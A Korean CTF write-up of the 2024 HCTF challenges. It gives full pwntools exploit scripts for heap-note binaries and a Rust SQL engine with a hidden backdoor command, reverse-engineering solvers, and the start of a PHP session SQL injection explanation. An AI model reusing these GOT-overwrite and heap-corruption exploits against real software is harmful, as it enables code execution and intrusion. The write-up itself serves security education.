---
title: 2024 HCTF writeup
description: HSPACE에서 출제한 2024 HCTF 전체 문제 풀이입니다.
author: ipwn
date: 2025-04-17 20:00:00 +0900
tags: [Tech, CTF]
categories: [Tech, CTF]
comments: false
math: true
mermaid: false
pin: false
image: /assets/img/2024_hctf_writeup/hctf.jpg
---

## 목차
1. [h-babynote](#h-babynote) - pwn
2. [h-note](#h-note) - pwn
3. [SQL injection](#sql-injection) - pwn
4. [Can't trust checker](#Cant-trust-checker) - rev
5. [Cespresso](#Cespresso) - rev
6. [LetsGoMoveMove](#LetsGoMoveMove) - rev
7. [fundamental](#fundamental) - web
8. [simple_archive](#simple_archive) - web
9. [atko](#atko) - crypto
10. [backforth](#backforth) - crypto
11. [ff](#ff) - crypto


### pwn
#### h-babynote
```c
    while (1){
        menu();
        int choice;
        printf(">> ");
        scanf("%d", &choice);
        switch (choice){
            case 1:
                add();
                break;
            case 2:
                edit();
                break;
            case 3:
                show();
                break;
            case 4:
                delete();
                break;
            case 5:
                exit(0);
                break;
            default:
                puts("Invalid choice");
                break;
        }
    }
```
일반적인 노트 문제와 같이 add, edit, show, delete 메뉴가 주어집니다.

```c
void add()
{
    int idx, lines;
    char buf[0x100];
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 20){
        puts("Invalid index");
        return;
    }
    printf("Lines: ");
    scanf("%d", &lines);
    char* temp = (char*)malloc(lines*0x10ULL);
    if (temp == NULL){
        puts("malloc failed");
        return;
    }
    pages[idx] = temp;
    printf("Note: ");
    read(0, pages[idx], lines*0x10ULL);
}
```
add 메뉴로 최대 20개까지 (사용자가 입력한 line * 0x10)의 크기로 청크를 할당하고 입력할 수 있습니다.


```c
void edit()
{
    int idx;
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 20){
        puts("Invalid index");
        return;
    }
    if (pages[idx] == NULL){
        puts("Invalid index");
        return;
    }
    char* cur = pages[idx];
    printf("Line: ");
    scanf("%d", &idx);
    cur += 0x10ULL*idx;
    printf("Note: ");
    read(0, cur, 0x10ULL);
}
```
edit 메뉴로 할당받은 청크부터 임의의 offset만큼 떨어진 주소에 0x10만큼 write할 수 있는 OOB Write 취약점이 주어집니다. (*Note: 음수 offset도 가능)

```c
void show()
{
    int idx;
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >=20){
        puts("Invalid index");
        return;
    }
    if (pages[idx] == NULL){
        puts("Invalid index");
        return;
    }
    char* cur = pages[idx];
    printf("Line: ");
    scanf("%d", &idx);
    cur += 0x10ULL*idx;
    printf("%s", cur);
}
```
마찬가지로 show 메뉴에서도 할당된 청크로부터 임의 offset만큼 떨어진 주소에서 0x10만큼 read할 수 있는 OOB 취약점이 주어집니다.

```c
void delete()
{
    int idx;
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 20){
        puts("Invalid index");
        return;
    }
    if (pages[idx] == NULL){
        puts("Invalid index");
        return;
    }
    free(pages[idx]);
}
```
마지막으로 delete 메뉴에서는 할당된 청크를 해제하지만, pages 배열에서 클리어하지 않아 dangling pointer에 접근할 수 있습니다. 


##### Exploit Scenario
정리해보면 힙에서 자유롭게 relative-read/write를 할 수 있는 상황입니다. 거기에 더해 UAF가 가능하기 때문에 다음과 같은 익스플로잇 시나리오를 구성할 수 있습니다.

- unsorted bin에 청크를 넣고 show를 사용하여 main_arena(->libc base)를 릭
- tcache에 청크를 넣고 edit 기능으로 next를 strlen@plt.got-0x10으로 설정 (tcache poisoning)
- 이후 strlen@got-0x10에 청크를 할당받아 strlen@plt.got를 system으로 overwrite
- `printf("%s", "/bin/sh")`를 호출해서 쉘 획득 

이를 구현한 익스플로잇 코드는 다음과 같습니다.

##### ex.py
```python

def exploit(p):
    offset = 0x21a090 # strlen_evex@got

    for i in range(8):
        add(10+i,0x400,b"A"*0x10)
    for i in range(7): # fill tcache
        delete(11+i)
    delete(10) # free -> unsorted bin 
    show(10, 0) # main_arena leak
    libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x21ace0
    log.info("libc_base: 0x{:x}".format(libc_base))
    system = libc_base + libc.sym["system"]
    add(0, 0x10, b"/bin/sh\x00"*2) # chunk for printf("%s", '/bin/sh')
    add(1, 0x10, b"A"*0x10)
    add(2, 0x10, b"A"*0x10)
    delete(1)
    delete(2)

    show(2, 0) # bypass safe linking
    leak = u64(p.recv(6).ljust(8, b"\x00"))
    heap_ptr = decrypt(leak)
    log.info("heap_ptr: 0x{:x}".format(heap_ptr))
    edit(2, 0, p64(encrypt(libc_base+offset))*2) # tcache poisoning
    add(3, 0x10, "AAAAA")
    add(3, 0x10, p64(system)*2) # overwrite strlen_evx@got
    show(0,0) # trigger printf("%s", '/bin/sh')

    p.sendline("cat flag.txt")
    print(p.recv(0x100))
    p.interactive()
    return
```
#### h-note
h-babynote 문제를 읽으셨다면 파악할 수 있겠지만 해당 코드에서 delete 기능만 제거됐습니다.

```c
    while (1){
        menu();
        int choice;
        printf(">> ");
        scanf("%d", &choice);
        switch (choice){
            case 1:
                add();
                break;
            case 2:
                edit();
                break;
            case 3:
                show();
                break;
            case 4:
                exit(0);
                break;
            default:
                puts("Invalid choice");
                break;
        }
    }
```
일반적인 노트 문제와 같이 add, edit, show 메뉴가 주어집니다.

```c
void add()
{
    int idx, lines;
    char buf[0x100];
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 20){
        puts("Invalid index");
        return;
    }
    printf("Lines: ");
    scanf("%d", &lines);
    if (lines < 0 || lines > 0x3000){
        puts("Invalid number of lines");
        return;
    }
    pages[idx] = (char*)malloc(lines*0x10ULL);
    printf("Note: ");
    read(0, pages[idx], lines*0x10ULL);
}

```
add 메뉴로 최대 20개까지 [사용자가 입력한 line * 0x10]의 크기로 청크를 할당하고 입력할 수 있습니다.


```c
void edit()
{
    int idx;
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 20){
        puts("Invalid index");
        return;
    }
    if (pages[idx] == NULL){
        puts("Invalid index");
        return;
    }
    char* cur = pages[idx];
    printf("Line: ");
    scanf("%d", &idx);
    cur += 0x10ULL*idx;
    printf("Note: ");
    read(0, cur, 0x10ULL);
}
```
edit 메뉴로 할당받은 청크부터 임의의 offset만큼 떨어진 주소에 0x10만큼 write할 수 있는 OOB Write 취약점이 주어집니다. (*Note: 음수 offset도 가능)

```c
void show()
{
    int idx;
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >=20){
        puts("Invalid index");
        return;
    }
    if (pages[idx] == NULL){
        puts("Invalid index");
        return;
    }
    char* cur = pages[idx];
    printf("Line: ");
    scanf("%d", &idx);
    cur += 0x10ULL*idx;
    printf("%s", cur);
}
```
마찬가지로 show 메뉴에서 할당된 청크로부터 임의의 offset만큼 떨어진 주소에서 0x10만큼 read할 수 있는 OOB 취약점이 주어집니다.

##### Exploit Scenario
정리해보면 힙 상에서 자유롭게 relative-read/write를 할 수 있는 상황입니다. 따라서 h-babynote처럼 할당한 청크를 해제할 수 있는 primitive가 있다면 free chunk의 포인터 정보를 leak/overwrite하는 방식으로 임의 코드를 실행할 수 있을 것입니다.

하지만 청크를 해제할 수 있는 방법이 아예 없기 때문에 힙 상에서 존재하는 청크들의 메타데이터를 아무리 자유롭게 조작해두어도 해제 및 재할당을 트리거할 수 없습니다. 따라서 해제된 청크의 포인터를 이용한 libc leak이나 임의 주소 할당을 통한 AAW를 달성하기 어렵습니다.

```
0x000055f26f843000 0x000055f26f844000 0x0000000000001000 0x0000000000003000 rw- /pwn-h-note/prob/for_organizer/chall
0x000055f2706ff000 0x000055f270720000 0x0000000000021000 0x0000000000000000 rw- [heap]
0x00007fee67ec3000 0x00007fee67ec6000 0x0000000000003000 0x0000000000000000 rw- <tls-th1>
0x00007fee67ec6000 0x00007fee67eee000 0x0000000000028000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
```
mmap을 통해 chunk를 할당받는다면 이런 어려움을 우회할 수 있습니다. malloc에 MMAP_THRESHOLD(0x20000) 바이트 이상의 할당을 요청하면 mmap을 통해 청크가 할당됩니다. heap 영역이 다른 영역과 인접하지 않게 할당되는 것과 달리, mmap 영역(tls-th1)에 할당된 청크는 libc 영역과 바로 인접한 것을 확인할 수 있습니다.

따라서 mmap으로 청크를 할당받는다면 heap relative read/write를 libc relative read/write로 바꿀 수 있습니다. 이후에는 접근할 수 있는 아무 포인터로 libc base를 확인, system으로 strlen_evex를 덮고 printf("%s", '/bin/sh')를 호출하여 플래그를 얻을 수 있습니다.  

##### ex.py
```python
def exploit(p):
    offset = 0x246088
    
    add(0, 0x100, b"/bin/sh\x00"*0x10)
    add(1, 0x28000, b"A"*0x10) ## allocate by mmap
    show(1, offset)
    libc_base = u64(p.recv(6).ljust(8, b"\x00"))-0x1b32b0
    libc.address = libc_base
    log.info("libc_base: 0x{:x}".format(libc_base))
    system = libc.sym["system"]
    edit(1,offset, p64(system)+p64(system))
    show(0, 0)
    p.sendline("cat flag.txt")
    print(p.recv(0x100))
    p.interactive()
    return
```

#### SQL injection
메모리 안전을 위한(...) SQL을 구현하는 게 목표라는 컨샙의 문제입니다...만... 여전히 허술하다는 이미지를 심어주기 위하여 `SELECT * FROM` 같은 구문들을 입력하였을 때, out of index를 접근하려고 한다거나 하는 등의 기믹을 추가해놓았습니다. 명령어에 대한 자세한 설명은 `HELP` 커맨드를 입력하여 확인할 수 있게 해놓았으니, 생략하겠습니다. 기존에 우리가 사용하는 sql 프로젝트들과 아주 유사한 커맨드로 작동합니다.

취약점은 두 가지 부분에서 발생합니다.

```rs
    fn update(&mut self, tokens: &[Vec<u8>]) {
        ...
                match col_type {
                    ColumnType::Text => {
                        if let Ok(num) = parse_int(val_str) {
                            updates.insert(
                                col_name.clone(),
                                DataType::Text(TextData {
                                    len: 0,
                                    capacity: 0,
                                    buffer: num as *mut u8,
                                }),
                            );
                        } else if is_string_literal(val_str) {
                          ...
                        }
                        ...
                    }
                }
    }
```

우선 첫 번째로, update쿼리를 진행할 때 변경하고자 하는 row의 coulmn이 Text type을 가지고 있더라도, int형의 값으로 변경할 수 있습니다. 이 때, 변경되는 값은 bytes value가 그대로 삽입된다든지, 리터럴하게 읽을 수 있는 값으로 삽입된다든지 하는 것이 아니라 포인터 형태로 우리가 입력한 숫자값이 그대로 TextData 타입의 변수로 삽입됩니다.
이후 update를 apply하는 `apply_update` 함수에서는 이전의 capacity와 length를 그대로 유지한채로 해당 값이 적용되게끔 함수가 구현되어 있기 때문에, 임의의 포인터가 잘못된 capacity와 legnth정보를 가진채로 그대로 삽입될 수 있습니다.
물론 굉장히 취약한 부분이긴 하지만 이 취약점이 완전한 Arbitrary Address Write primitive까지 제공해주는 것은 아닙니다. 
다행히도 Rust는 ownership와 variable들에 대한 lifetime등의 다양한 문제로 우리가 입력한 포인터 값을 update function 진행 중에 **한 번 할당 해제**해버립니다. 즉, 이 취약점은 Freeable한 주소 내에서만 작동합니다.

일단 이 정보만 가지고 두 번째 취약점에 대해서도 알아보겠습니다.

```rs
    fn execute(&mut self, query: &[u8]) {
        ...
        let tmp: [u8; 10] = [0x68, 0x43, 0x74, 0x46, 0x4c, 0x65, 0x74, 0x73, 0x67, 0x4f];
        let test_command = tmp.to_vec();
        if tokens[0] == test_command {
            self.______(&tokens);
        }
    }

    fn ______(&mut self, tokens: &[Vec<u8>]) {
        ...
                    match col_type {
                        ColumnType::Integer => {
                            if let Ok(num) = parse_int(val_str) {
                                updates.insert(col_name, DataType::Integer(num));
                            } else if is_string_literal(val_str) {
                                let content = &val_str[1..val_str.len() - 1];
                                if content.len() >= 8 {
                                    let new_len = content.len();
                                    let new_capacity = ((new_len + 0x0F) / 0x10) * 0x10;
                                    unsafe { 
                                        let layout =
                                            Layout::from_size_align(new_capacity, 0x10).unwrap();
                                        let buffer = alloc(layout);
                                        ptr::copy_nonoverlapping(content.as_ptr(), buffer, new_len);
                                        updates.insert(
                                            col_name, 
                                            DataType::Integer(
                                                buffer as i64
                                            )
                                        );
                                    };
                                } else {
                                    return;
                                }
                            } 
                            ...
                        }
                    }
                    ...
    }
```

네, 코드를 분석해보면 알 수 있듯이, 뜬금없이 `HELP`커맨드로는 설명되지 않는 숨겨진 백도어 커맨드가 존재합니다. (문제 설명에서 백도어에 대한 언급이 있기 때문에, 굉장히 유사도가 높은 두 함수를 리버싱하다보면 취약점을 찾아낼 수 있을 거라고 생각했습니다.) 해당 커맨드는 `hCtFLetsgO`를 커맨드로 입력하면 호출되며, 함수 동작의 큰 틀은 `update`함수와 완전히 똑같습니다. 특정 row의 column 값을 update하는 함수입니다.

그러나 이번에는 Integer 타입을 가지는 column의 값을 Text 타입으로 변환하는 것에 대해 방지하지 않습니다. 오히려 포인터를 생성한 후, 우리의 입력값을 복사한 뒤에 해당 포인터를 **정수로 변환하여** 컬럼에 저장합니다. 당연히 컬럼의 타입은 변환되지 않습니다.

이를 통해 우리는 새로 할당되는 버퍼의 주소값을 `SELECT` 명령어를 사용하여 읽을 수 있게 됩니다.

위 두 취약점을 통해 우리는 heap 내부의 freeable한 주소를 마음껏 write할 수 있습니다. 이후의 exploit scenario는 여러가지가 있을 수 있겠지만, 출제자는 아래와 같은 방식으로 exploit하였습니다.

```rs
struct TextData {
    len: usize,
    capacity: usize,
    buffer: *mut u8,
}
```

1. 우선, 백도어 취약점을 통해 동적 할당된 버퍼 주소(Heap area)를 leak합니다. (heap leak)
2. 큰 크기를 가지는 str type의 변수를 생성하여 내부에 fake chunk를 배치하고 update함수의 취약점을 통해 이를 해제시켜 변수 내에 libc 주소가 남도록 해 이 값을 읽습니다. (libc leak)
3. leak한 heap 주소를 통해 특정 column의 row에 대한 정보를 담고 있는 주소를 유추합니다. (Rust 언어의 특성상 heap layout이 어느정도 유동적이므로 일정 수준의 brute forcing이 요구됩니다.)
4. TextData구조체 변수는 length(8bytes), capacity(8bytes), buffer(8btytes) 순으로 메모리에 배치됩니다. 
5. TextData의 멤버변수인 length는 정확히 입력의 길이이기 때문에 이를 적절히 조절하여, fake chunk로 활용할 수 있습니다. 
6. 위 정보와 update 함수의 취약점을 사용하여 앞서 유추한 주소에 존재하는 fake chunk로 str type의 변수 주소를 바꾸어 특정 컬럼 변수의 buffer 포인터 위치에 내가 원하는 값을 쓸 수 있도록 합니다. (안전한 AAW primitive 획득)
7. 이후에는 exit handler를 overwrite하여 pc를 catch하고 shell을 획득했습니다.

해당 시나리오는 꽤 복잡하고, 3 ~ 6번 과정에서 몇 번의 brute forcing이 필요하기 때문에 최고의 시나리오는 아니라고 생각합니다. 더 좋은 방법으로 exploit하신 분들은 해당 scenario 공유 부탁드립니다 😉

전체적인 exploit script는 아래와 같습니다.

##### ex.py
```py
from pwn import *
from bitstring import BitArray

e = ELF('./prob')

while True:
    p = remote('0', 55555)

    sla = p.sendlineafter
    sa = p.sendafter

    def select(table, col, cond=None):
        query = b'select %s from %s'%(col, table)
        if cond != None:
            query += b' where %s'%cond
        sla(b'> ', query)

    def insert(table, cols, vals):
        query = b'insert into %s %s values %s'%(table, cols, vals)
        sla(b'> ', query)

    def update(table, col, val, cond=None):
        query = b'update %s set %s = %s'%(table, col, val)
        if cond != None:
            query += b' where %s'%cond
        res = sla(b'> ', query, timeout = 3)
        if res == b'':
            raise

    def decode(output):
        out = b''
        for i in range(len(output)):
            c = output[i].to_bytes(1, 'little')
            if c != '\\':
                out += c
            else:
                out += p8(int(output[i+2:i+4], 16))
                i += 4
        return out

    sla(b'>', b'create table go1 (a int, b str)')
    sla(b'>', b'create table go2 (a int, b str)')

    pay = p64(0x0) + p64(0x801)
    pay += b'A'*0x120
    pay += p64(0) + p64(0x6f1)
    pay = pay.ljust(0x800, b'A')
    pay += p64(0x0) + p64(0x21)
    pay += b'A'*0x10
    pay += p64(0x0) + p64(0x21)
    pay += b'A'*0x10

    insert(b'go1', b'(a, b)', b"(%d, '%s')"%(1, pay))
    sla(b'>', b"hCtFLetsgO go1 a = 'BBBBBBBB'")
    select(b'go1', b'*')
    p.recvuntil(b': ')
    heap = int(p.recvuntil(b',')[:-1]) - 0x2ff0
    f_chunk = heap + 0x69e0
    target = heap + 0x6230
    log.info('[HEAP] %#x'%heap)
    log.info('[Fake] %#x'%f_chunk)
    log.info('[Target] %#x'%target)

    pay = b'\0'*0x850

    insert(b'go2', b'(a, b)', b"(%d, '%s')"%(1, pay))
    update(b'go2', b'b', b'%d'%(f_chunk))

    select(b'go1', b'*')
    p.recvuntil(b'b: ')
    leak = p.recvuntil(b'query')[:-5]
    leak = decode(leak)

    libc = u64(leak[0x10:0x18]) - 0x21b1d0
    fsbase = libc - 0x2840
    initial = libc + 0x228E70
    system = libc + 0x50d70
    lego = heap + 0xb50
    binsh = libc + 0x1d8678
    log.info('[GLIBC] %#x'%libc)
    log.info('[FSBASE] %#x'%fsbase)

    sla(b'>', b'create table go3 (a int, b str)')

    pay = b'C'*0x8e1
    insert(b'go3', b'(a, b)', b"(%d, '%s')"%(0, pay))
    update(b'go1', b'b', b'%d'%target)
    # pause()

    pay = b''
    pay += p64(0x8f0) + p64(fsbase + 0x30)
    try:
        update(b'go1', b'b', b"'%s'"%pay)
        sla(b'> ', b'')
        sla(b'> ',b"update go3 set b = 'ABCD\"")
        update(b'go3', b'b', b"'%s'"%b'AAAABBBB')
        update(b'go3', b'b', b"'%s'"%p64(0))
    except:
        p.close()
        continue
    log.info("!?")
    break
pay = b''
pay += p64(0x8f0) + p64(lego)

over = BitArray(uint=system, length=64)
over.rol(0x11)
over = over.uint

update(b'go1', b'b', b"'%s'"%pay)
update(b'go3', b'b', b"'%s'"%(p64(over) + p64(binsh)))

update(b'go1', b'b', b'%d'%0)
update(b'go3', b'b', b'%d'%0)

sla(b'> ', b'exit')
p.interactive()
```

### Rev
#### Can't trust checker
C++ 형식의 바이너리이기에 분석에 유의하여야 하며, 분석해보면 아래와 같은 형식으로 이루어져있습니다.

```
1.특정한 형식의 입력받기
2.간단한 연산 진행
3.행렬곱 연산 
4.연산결과 2진수로 transform
5.nemo logic 검증
```

문제에서 주로 다루는 부분은 nemo logic 검증 부분으로 문제 내부에 이미 nemo logic의 정답이 주어져 있습니다. 다만 이를 알아내려면 nemo logic임을 빠르게 파악하거나 검증 부분을 분석해내야 합니다. 해당 부분을 이용해서 역으로 로직을 진행해주면 됩니다.

nemo logic 검증 부분이 굉장히 러프하게 작성되었기에 혹시 모를 중복해를 방지하기 위해 md5로 검증하는 파트가 있습니다.

어쨌든, nemo logic의 정답을 이용해 플래그를 얻는 것이 의도된 풀이입니다. 아래는 문제 풀이 스크립트입니다.


##### ex.py
```python
from sage.all import *
enc=[[[0,1,0,0,0,1,0,0],
[0,1,1,1,0,0,0,0],
[1,0,0,1,0,0,0,1],
[1,1,1,0,1,0,0,0],
[1,0,1,0,0,0,0,0],
[1,1,1,1,0,0,1,1],
[1,1,0,0,0,1,1,1]],
[[1,0,0,1,0,1,1,1],
[1,0,0,0,0,0,1,1],
[1,0,0,1,1,1,0,1],
[1,1,0,0,1,0,1,1],
[0,1,1,1,1,0,1,1],
[1,0,0,0,0,1,1,0],
[0,1,1,1,1,0,0,0]],
[[1,0,0,1,0,1,0,0],
[0,1,1,0,1,0,0,0],
[1,0,0,1,0,0,1,1],
[1,0,0,1,0,0,0,0],
[0,0,0,1,0,1,1,1],
[0,1,0,0,0,0,1,0],
[0,1,0,0,0,0,0,1]],
[[0,0,1,0,0,0,0,0],
[1,1,1,0,1,0,0,1],
[0,1,0,0,1,0,0,1],
[1,1,1,1,1,0,1,0],
[1,0,0,1,0,1,1,0],
[1,0,0,0,0,1,0,1],
[0,1,0,0,0,0,1,1]],
[[1,1,0,0,1,1,0,0],
[1,1,1,1,1,1,0,1],
[0,1,0,1,0,0,0,0],
[0,1,1,1,1,0,0,0],
[1,0,1,0,0,0,1,0],
[0,0,1,1,0,1,1,0],
[1,1,1,1,0,0,0,1]],
[[1,0,0,1,1,0,0,0],
[1,0,1,0,0,1,1,1],
[0,0,0,1,1,1,0,1],
[1,1,1,0,1,0,0,0],
[0,0,1,1,0,1,0,1],
[1,1,0,1,0,1,0,1],
[1,1,0,1,1,0,1,0]],
[[0,1,1,1,0,1,0,0],
[1,1,1,1,1,1,0,0],
[0,1,0,0,0,1,1,0],
[0,0,0,1,1,1,0,0],
[0,1,0,1,1,0,1,0],
[1,0,0,0,1,0,0,0],
[1,1,1,1,0,0,1,0]]]
tout=[]
for i in range(len(enc)):
    z=[]
    for j in range(len(enc[i])):
        b=map(str,enc[i][j])
        z.append(int("".join(b)[::-1],2))
    tout.append(z)
key = [
    [149 ,117 , 55, 195, 211,  66, 148],
[184 , 96 ,149 , 49 ,237 ,118 ,152],
[ 20 , 41 ,230 , 79 ,235 , 78 ,253],
[234 ,178 , 38 ,133 , 20 ,186 ,144],
[127 ,166 , 31 ,183 ,183 ,114 ,128],
[252 , 30 ,209 , 38  ,30 ,  3 , 29],
[225 ,224 , 70 ,233  , 6 ,200 ,137]
]
matrix2 = Matrix(IntegerModRing(256),7,key)

def inverse_matrix(mat1,mat2,size,mod=256):
    matrix1 = Matrix(IntegerModRing(mod),size,mat1)
    matrix2 = Matrix(IntegerModRing(mod),size,mat2)
    result  = matrix1*matrix2.inverse()
    return result.list()

def reverse_convert(numbers):
    result = []
    for num in numbers:
        if 1 <= num <= 26:
            result.append(chr(num - 1 + ord('A')))
        elif 27 <= num <= 52:
            result.append(chr(num - 27 + ord('a')))
        elif 53 <= num <= 62:
            result.append(chr(num - 53 + ord('0')))
        elif num == 63:
            result.append('_')
    return "".join(result)
    
out=inverse_matrix(tout,key,7)
flag="HCTF{"+reverse_convert(out)+"}"
print(flag)
```

#### Cespresso
문제는 flag.png를 compress하는 기능만 수행해놓아서 문제 내에서는 decompress가 따로 구현되어있지 않습니다.

```
realsung@DESKTOP-OFIT2BM:/mnt/c/Users/sungj/Desktop/rev-login$ ./compress
Usage: ./compress [e/d] input_file output_file
e: encode (compress)
d: decode (decompress)
```

compress 로직을 분석해보면, 입력된 파일의 3바이트를 24비트 정수로 변환하고 이를 6비트씩 4개 블록으로 분할하고 저장합니다. 즉, 3:4 변환 비율로 (33% 크기 증가) compress 하는 방식입니다.
때문에 단순히 이를 역으로 변환해주면 됩니다. 아래는 풀이를 진행하는 decrypt 스크립트입니다.

##### ex.c
```c
void decode_block(unsigned char *in, unsigned char *out) {
    unsigned char vals[4];
    
    for(int i = 0; i < 4; i++) {
        if(in[i] >= 'A' && in[i] <= 'Z') vals[i] = in[i] - 'A';
        else if(in[i] >= 'a' && in[i] <= 'z') vals[i] = in[i] - 'a' + 26;
        else if(in[i] >= '0' && in[i] <= '9') vals[i] = in[i] - '0' + 52;
        else if(in[i] == '+') vals[i] = 62;
        else if(in[i] == '/') vals[i] = 63;
    }
    
    unsigned int val = (vals[0] << 18) | (vals[1] << 12) | (vals[2] << 6) | vals[3];
    out[0] = (val >> 16) & 0xFF;
    out[1] = (val >> 8) & 0xFF;
    out[2] = val & 0xFF;
}
```

#### LetsGoMoveMove
Blockchain에서 사용되는 Move VM을 사용하는 문제입니다.
move disassembler을 사용해 Checker.mv 파일의 disassemble 결과를 확인할 수 있습니다. opcode가 직관적이여서 대체로 코드를 이해하기 어렵지 않습니다.

아래는 disassemble 결과와 로직 분석입니다.

```rs
public main(Arg0: vector<u8>): vector<u8> /* def_idx: 1 */ {
L1:	loc0: bool
L2:	loc1: u64
L3:	loc2: vector<u8>
L4:	loc3: u64
...
    2: ImmBorrowLoc[0](Arg0: vector<u8>)
    3: VecLen(1)
    4: LdU64(32)
    5: Neq
    6: BrFalse(9)
B1:
    7: LdConst[1](Vector(U8): [5, 119, 114, 111, 110, 103])
    8: Ret
```
1. main 함수에서 Arg0 을 받아서 32bytes인지 확인하고, 32bytes가 아니면 wrong을 반환합니다.

```rs
    0: LdConst[0](Vector(U8): [32, 238, 226, 220, 229, 214, 183, 183, 188, 189, 188, 187, 186, 189, 189, 186, 186, 229, 183, 188, 228, 186, 189, 186, 228, 227, 186, 188, 228, 189, 188, 182, 209])
    1: StLoc[3](loc2: vector<u8>)
    2: ImmBorrowLoc[0](Arg0: vector<u8>)
...
B2:
    9: LdU64(0)
    10: StLoc[4](loc3: u64)
    11: LdFalse
    12: StLoc[1](loc0: bool)
    13: ImmBorrowLoc[0](Arg0: vector<u8>)
    14: VecLen(1)
    15: StLoc[2](loc1: u64)
B3:
    16: CopyLoc[1](loc0: bool)
    17: BrFalse(23)
B4:
    18: MoveLoc[4](loc3: u64)
    19: LdU64(1)
    20: Add
    21: StLoc[4](loc3: u64)
    22: Branch(25)
B5:
    23: LdTrue
    24: StLoc[1](loc0: bool)
B6:
    25: CopyLoc[4](loc3: u64)
    26: CopyLoc[2](loc1: u64)
    27: Lt
    28: BrFalse(44)
B7:
    29: ImmBorrowLoc[0](Arg0: vector<u8>)
    30: CopyLoc[4](loc3: u64)
    31: VecImmBorrow(1)
    32: ReadRef
    33: CastU16
    34: Call enc(u16): u8
    35: ImmBorrowLoc[3](loc2: vector<u8>)
    36: CopyLoc[4](loc3: u64)
    37: VecImmBorrow(1)
    38: ReadRef
    39: Neq
    40: BrFalse(43)
```
2. 백터값을 하나씩 가져와 enc 함수를 호출하고, loc2 에 위치한 백터와 하나씩 비교합니다. 만약 값이 다르면 wrong을 반환합니다.

```rs
    45: Call aptos_hash::keccak256(vector<u8>): vector<u8>
    46: LdConst[2](Vector(U8): [32, 238, 173, 186, 176, 150, 6, 212, 172, 35, 208, 24, 89, 94, 78, 190, 154, 132, 237, 193, 118, 237, 159, 181, 152, 229, 5, 174, 71, 70, 125, 134, 153])
    47: Eq
    48: BrFalse(51)
```
3. keccak256해시를 진행해서 입력값이 특정 해쉬와 맞는지 체크하고, 다르면 wrong을 반환합니다. 해시를 제공하는 이유는 중복해가 발생할 수 있기 때문입니다.

```rs
enc(Arg0: u16): u8 /* def_idx: 0 */ {
B0:
    0: CopyLoc[0](Arg0: u16)
    1: LdU16(240)
    2: Add
    3: CopyLoc[0](Arg0: u16)
    4: LdU16(2)
    5: BitOr
    6: CopyLoc[0](Arg0: u16)
    7: LdU8(1)
    8: Shr
    9: Xor
    10: Xor
    11: MoveLoc[0](Arg0: u16)
    12: LdU16(128)
    13: Add
    14: Xor
    15: LdU16(255)
    16: BitAnd
    17: CastU8
    18: Ret
}
```
enc 함수는 u16 으로 캐스팅 된 bytes를 받아서 위와 같은 연산을 수행 후 반환하는데, 파이썬으로 구현하면 아래와 같습니다. 

```py
(((inp + 0xf0) ^ ((inp|0x2) ^ inp>>1) ^ (inp+0x80))&0xff)
```
이 연산은 역산이 불가능하고 1,2번째 bit가 손실되기 때문에 중복해가 발생할 수 있는 것입니다.

```python
def enc(inp):
    return (((inp + 0xf0) ^ ((inp|0x2) ^ inp>>1) ^ (inp+0x80))&0xff)

for i in range(32):
    print(f'i: {i} | ',end=' ')
    flags.append(list())
    for j in range(32,127):
        if enc(j) == flag_enc[i]:
            print(f"{chr(j)}, ",end='')
            flags[i].append(chr(j))
    print('')
```
위 스크립트로 테스트해보면, 각 글자별로 두개의 경우의 수가 나오는데 전체적으로 대략 2**32 의 경우의 수가 발생합니다.

```rs
i: 0 |  h, k,
i: 1 |  `, c,
i: 2 |  t, w,
i: 3 |  e, f,
i: 4 |  x, {,
i: 5 |  9, :,
i: 6 |  9, :,
i: 7 |  4, 7,
i: 8 |  5, 6,
i: 9 |  4, 7,
i: 10 |  1, 2,
i: 11 |  0, 3,
i: 12 |  5, 6,
i: 13 |  5, 6,
i: 14 |  0, 3,
i: 15 |  0, 3,
i: 16 |  e, f,
i: 17 |  9, :,
i: 18 |  4, 7,
i: 19 |  d, g,
i: 20 |  0, 3,
i: 21 |  5, 6,
i: 22 |  0, 3,
i: 23 |  d, g,
i: 24 |  a, b,
i: 25 |  0, 3,
i: 26 |  4, 7,
i: 27 |  d, g,
i: 28 |  5, 6,
i: 29 |  4, 7,
i: 30 |  8, ;,
i: 31 |  }, ~,
```
그러나 출력값을 확인해보면, 플래그가 16진수로 되어있음을 얼추 짐작할 수 있고, 경우의 수는 2**20으로 줄어듭니다. 크게 어려운 점 없이 BFS 알고리즘을 통한 스크립트로 몇 초만에 플래그를 찾을 수 있습니다. 아래는 문제 풀이 스크립트 입니다.

##### ex.py
```python
from Crypto.Hash import keccak
import time
def enc(inp):
    return (((inp + 0xf0) ^ ((inp|0x2) ^ inp>>1) ^ (inp+0x80))&0xff)
flag_enc = [238, 226, 220, 229, 214, 183, 183, 188, 189, 188, 187, 186, 189, 189, 186, 186, 229, 183, 188, 228, 186, 189, 186, 228, 227, 186, 188, 228, 189, 188, 182, 209]
flags = []
charset = list(b"hctf{}abde0123456789")
for i in range(32):
    print(f'i: {i} | ',end=' ')
    flags.append(list())
    for j in charset:
        if enc(j) == flag_enc[i]:
            print(f"{chr(j)}, ",end='')
            flags[i].append(chr(j))
    print('')

def bfs(cur):
    if len(cur) == 32:
        h = keccak.new(digest_bits=256)
        h.update(''.join(cur).encode())
        if h.hexdigest() == "eeadbab09606d4ac23d018595e4ebe9a84edc176ed9fb598e505ae47467d8699":
            print(''.join(cur))
            end = time.time()
            print(end-start)
            exit(0)
        return

    for i in flags[len(cur)]:
        bfs(cur+[i])
start = time.time()
bfs(list("hctf{"))
```

### Web
#### fundamental
직접 코딩해준 mysql 기반의 세션 핸들러를 php session handler로 사용하고 있습니다. session write (값 입력) 시 serialization된 값이 db에 저장되게 되는데, $value에 대한 필터링 및 검증이 없기 때문에 session의 key-value를 지정하는 과정에서 session write함수가 호출되므로, in-direct하게 SQL Injection이 발생하게 됩니다. 

